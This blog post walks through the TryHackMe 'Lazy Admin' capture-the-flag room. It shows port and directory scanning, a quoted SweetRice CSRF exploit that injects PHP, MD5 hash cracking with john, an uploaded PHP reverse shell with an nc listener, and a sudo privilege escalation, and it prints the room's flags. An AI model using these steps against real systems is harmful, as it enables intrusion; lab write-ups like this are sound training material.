---
title: "THM Lazy Admin Writeup"
date: 2025-06-27T13:43:00-04:00
draft: false
author: "Yu-Kai \"Steven\" Wang"
tags: [kali linux, linux, ctf, php, reverse-shell, exploit, web, vpn, csrf, hash-cracking]
categories: [hacking]
featuredImage: '/images/thm_lazy_admin.jpg'
---

Today we are going to be doing this CTF challenge on THM: [Lazy Admin](https://tryhackme.com/room/lazyadmin).

I thought since I haven't update the blog in a while, might as well make a blog post documenting the steps I did. 

{{< admonition type=warning title="Disclaimer" open=true >}}
I am no hacker, but my good friend Sean who's a cybersecurity master did dragged me into his security club during college so here we go :P
{{< /admonition >}}

For this challenge I'll be using my Kali linux VM on my macbook running [VMWare Fusion](https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion), since I don't want to trash my laptop with useless files. *It is actually a pain installing VMWare Fusion with Kali on a Mac, maybe I'll make a post in the future.*

### Finding The Way In

Upon starting the machine we get the following IP address:

```
10.10.112.79
```

Visiting the IP gives us the default Apache web page. Viewing the page source reveals nothing.

{{< image src="./images/apache.png" caption="Apache web server default page." >}}

Let's scan for open ports using `nmap`:

```
nmap -sC -sV -T4 10.10.112.79
```

{{< image src="./images/nmap.png" caption="nmap results." >}}

Nothing interesting, just a standard SSH and HTTP port.

We'll do a directory enumeration using `gobuster` to scan for pages in the web server.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.112.79 -t 80
```

{{< image src="./images/gobuster.png" caption="Gobuster result." >}}

The scan found the `/content` page, let's check it out.

{{< image src="./images/content.png" caption="SweetRice CMS under /content." >}}

Seems like the server is running on a CMS (Content management system) called SweetRice, time to find an exploit.

### Vulnerability Scanning

Like any responsible hacker would do, we search for known vulnerability for SweetRice using `searchsploit`. 

```
searchsploit SweetRice
```

{{< image src="./images/searchsploit.png" caption="Searchsploit result." >}}

Cool, seems like SweetRice has a bunch of vulnerability that we can use to our advantage. 
However, we do not know the exact version of SweetRice the server is running, so I ended up picking the newest version (40700).
We can download the exploit using the following command:

```
searchsploit -m php/webapps/40700.html
```

The exploit `40700.html` gives us the following information:

```
<!--
# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1


# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo();
Code You Can
Customize Exploit For Your Self .

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->
```

Looks like a [CSRF (Cross-Site Request Forgery)](https://owasp.org/www-community/attacks/csrf) attack. 
The exploit allows us to upload any arbitrary `php` script to the server, by pretending the script as the code for an advertisement. 

Let's test the exploit by modifying the script (replacing `localhost` as `10.10.112.79/content`). 
After that, it should be executed when we open the html in the browser.

{{< image src="./images/exploit.png" caption="40700.html redirects us to the login page." >}}

The exploit has been executed and it redirects us to the login page. 

Let's check if the arbitrary php is uploaded by going to `http://10.10.112.79/content/inc/ads/hacked.php` as specifed in the exploit.

{{< image src="./images/empty.png" caption="404 not found." >}}

Hmmm, seems like the exploit isn't working correctly. However, it did gave us some insight:
- Login page is located at `/content/as/`
- Files and assets of the web is under `/content/inc/`

Going to `http://10.10.112.79/content/inc` did show us all the assets hosted by the web server, but the folder `ad` is no where to be found. 
Perhaps the exploit only works if the `ad` directory was created first. 

Scanning through the assets I found an interesting folder named `mysql_backup/`, let's see what's in there. 

{{< image src="./images/assets.png" caption="Assets found under the /content/inc directory." >}}

Inside the `mysql_backup/` folder is a `.sql` file, a quick dive into the file shows us the following lines:

{{< image src="./images/mysql.png" caption="Username and password hash found in the .sql file." >}}

We found it! looks like someone accidently put the username and the password hash on there.

### The Hacking

Quick recap for what we found:
- Username: `manager`
- Password (hashed): `42f749ade7f9e195bf475f37a44cafcb`

We can do a quick dictionary attack to decrypt the hashed password. 
Let's save the hash in `pass.hash` and use our good friend `john` to perform the attack.

```
echo "42f749ade7f9e195bf475f37a44cafcb" > pass.hash
```

The hash looks like a MD5, so we'll focus on this format first to speed up the process.
We'll be using the `rockyou.txt` as our dictionary for common passwords.

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 pass.hash
```

To see the cracked password:
```
john --show --format=Raw-MD5 pass.hash
```

{{< image src="./images/john.png" caption="Password hash cracked using John the Ripper." >}}

We found it! The password is `Password123`!

Let's try to login with the credential we just found to see what we can get. Recall that the login page is at `/content/as`.

{{< image src="./images/panel.png" caption="SweetRice admin panel." >}}

Looks like we got in the admin panel.
On the sidebar we can see the `Ads` panel, which allows us to upload any arbitrary `php` code to the server. 

{{< image src="./images/ads-panel.png" caption="Advertisement panel that allows arbitrary file upload." >}}

Since we know that we can upload any file we want and access the file at `/content/inc/ads/`, let's upload a `php reverse shell`.

I'll be using [this script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) created by *pentestmonkey*.
We'll have to modify the IP and port to redirect the reverse shell to our machine. 
The port can really be whatever you want as long as it's not occupied by another service (I'll be using `9001`). 

Since I'm running my kali linux in a VM on my macbook while connected to the TryHackMe VPN, I'll have to use the IP of my macbook (not the Kali VM). 
We can use `ifconfig` to see our machine IP. 

{{< image src="./images/ifconfig.png" caption="IP address of my macbook on the THM VPN." >}}

Now we can modify the php reverse shell script with our IP and port:

```
...
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.112.79';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
...
```

Now copy the entire script, paste it into the ads portal, give it a name `shell`, and upload it to the web server.

{{< image src="./images/shell.png" caption="Uplaod the reverse shell." >}}

Click "DONE" and the script should be uploaded. 
Now we have to listen for port `9001` using `nc` before we can execute the script.
Open a new terminal and excute the following (if you're running on a VM, open the terminal on the host machine (macbook in my case)):

```
nc -l 9001
```

{{< image src="./images/nc-first.png" caption="Netcat listening to port 9001." >}}

Nothing is going to show up yet until we execute the php reverse shell script. 
Now go to `/content/inc/ads` and you should see the script we uploaded.

{{< image src="./images/shell-exec.png" caption="The reverse shell script we just uploaded." >}}

Click on the script to run it, and check for outputs on our netcat terminal. A successfull connection should look something like this:

{{< image src="./images/rshell.png" caption="Successful reverse shell." >}}

We are looking for a user flag, and a quick scan of the directory shows us a file in `/home/itguy/user.txt`. 
Running `cat /home/itguy/user.txt` gives us the first flag:

```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

### Privilege Escalation

Now that we've found the user flag, it's time to find the root flag. 
The root flag, as the name suggests, is probably hidden somewhere within the `/root` directory. 

Attempt to `cd` into the root gives us a permission denied error:

{{< image src="./images/cdroot.png" caption="Permission denied." >}}

This is because we are logged in as the `www-data` user, which is the default user that the webserver runs to maintain the website functionality. 
We'll have to find a way to escalate our privilege to root. 

Let's start by checking what sudo permission we have as `www-data`:

```
sudo -l
```

{{< image src="./images/sudol.png" caption="Permission check." >}}

Looks like we have the permission to execute `/usr/bin/perl /home/itguy/backup.pl` as root. 
Let's see what `/home/itguy/backup.pl` contains:

{{< image src="./images/backup.png" caption="backup.pl executes the /etc/copy.sh file." >}}

Great, looks like `/home/itguy/backup.pl` simply executes `/etc/copy.sh`. 
If we can somehow modify `/etc/copy.sh`, we'll be able to escalate our privileges.
Let's check the permission of `/etc/copy.sh`:

```
ls -al /etc/copy.sh
```

{{< image src="./images/lsal.png" caption="copy.sh can be modified by anyone." >}}

The last three characters `rwx` tells us that anyone can modify `copy.sh`!
Let's try to open it up with an editor.

{{< image src="./images/editor.png" caption="No editor seems to be working." >}}

Sadly, no editors seems to be working. Fortunately we can still use `cat`. 
Let's overwite the file with a shell spawner:

```
cat > /etc/copy.sh << 'EOF'
#!/bin/bash
/bin/bash
EOF
```

We can then run the `/home/itguy/backup.pl` to execute the shell spawner as root.

```
sudo /usr/bin/perl /home/itguy/backup.pl
```

A quick explore in the root directory give us the final root flag.

{{< image src="./images/root.png" caption="Root flag captured." >}}

The root flag is:

```
THM{6637f41d0177b6f37cb20d775124699f}
```

That's all, IsaacTheHacker checking out.